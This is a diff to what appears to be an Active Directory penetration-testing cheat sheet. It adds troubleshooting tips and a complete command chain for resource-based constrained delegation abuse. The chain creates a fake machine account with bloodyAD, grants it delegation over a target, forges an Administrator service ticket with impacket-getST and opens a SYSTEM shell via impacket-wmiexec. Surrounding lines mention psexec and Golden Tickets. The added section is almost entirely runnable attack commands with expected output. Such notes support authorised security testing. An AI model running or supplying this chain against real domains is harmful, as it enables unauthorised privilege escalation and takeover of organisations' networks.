@@ -127,6 +127,43 @@ export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass <domain>/Administrator@<targetfqdn>
 ```
 
+#### RBCD Operational Pitfalls (this is where the chain usually breaks)
+
+- **Unset `KRB5CCNAME` before `getST`.** If it's still pointing at a stale ccache from a previous attempt, `getST` silently uses it and fails without a useful error. Always `unset KRB5CCNAME` first.
+- **Clock skew.** Kerberos rejects tickets more than 5 minutes out of sync. If you get `KRB_AP_ERR_SKEW`: `sudo ntpdate <dc-ip>` (or `sudo rdate -n <dc-ip>` if ntpdate isn't around).
+- **`/etc/hosts` must resolve the target FQDN.** `impacket-wmiexec -k` and friends validate the SPN against the hostname you gave them — connect by FQDN, not IP. Add the line: `<dc-ip>   dc01.domain.local  domain.local`.
+- **Use the target's `sAMAccountName`, not FQDN, as the RBCD target argument.** `bloodyAD add rbcd DC01$ FAKE01$` — with the `$` — not `dc01.domain.local`.
+- **The ccache filename is whatever impacket picked.** Rather than guessing, `export KRB5CCNAME=$(ls *.ccache)` — one match, done.
+- **You need to *actually* hold the write right.** Verify via `bloodyAD get writable` or BloodHound before wasting time on the S4U dance. Group-inherited rights only work if you're authenticated as a member of that group, not just any domain user.
+- **Machine account quota (MAQ).** Default is 10 — any authenticated user can add up to 10 computer accounts. If MAQ is 0, `addcomputer` fails; find an existing computer object you have write on instead.
+
+##### Full chain (with the pitfalls handled)
+
+```bash
+## 1. Sanity: sync time, unset any stale ticket, add FQDN to hosts
+sudo ntpdate <dc-ip>
+unset KRB5CCNAME
+echo "<dc-ip>   <dc-fqdn>   <dom>.local" | sudo tee -a /etc/hosts
+
+## 2. Create the fake computer (needs MAQ ≥ 1)
+bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' \
+    add computer FAKE01 'Passw0rd123!'
+
+## 3. Grant FAKE01 RBCD over the target
+bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' \
+    add rbcd '<target-sAMAccountName>$' 'FAKE01$'
+##    Expect: [+] FAKE01$ can now impersonate users on <target>$ via S4U2Proxy
+
+## 4. Request a service ticket as Administrator against the target
+impacket-getST -spn cifs/<target-fqdn> -impersonate Administrator \
+    -dc-ip <dc-ip> '<dom>.local/FAKE01$:Passw0rd123!'
+
+## 5. Use it
+export KRB5CCNAME=$(ls *.ccache)
+impacket-wmiexec -k -no-pass <dom>.local/Administrator@<target-fqdn> -dc-ip <dc-ip>
+##    Should land as NT AUTHORITY\SYSTEM
+```
+
 ### Golden Ticket
 
 Forge a TGT using the `krbtgt` hash → "I am Administrator, signed by me."
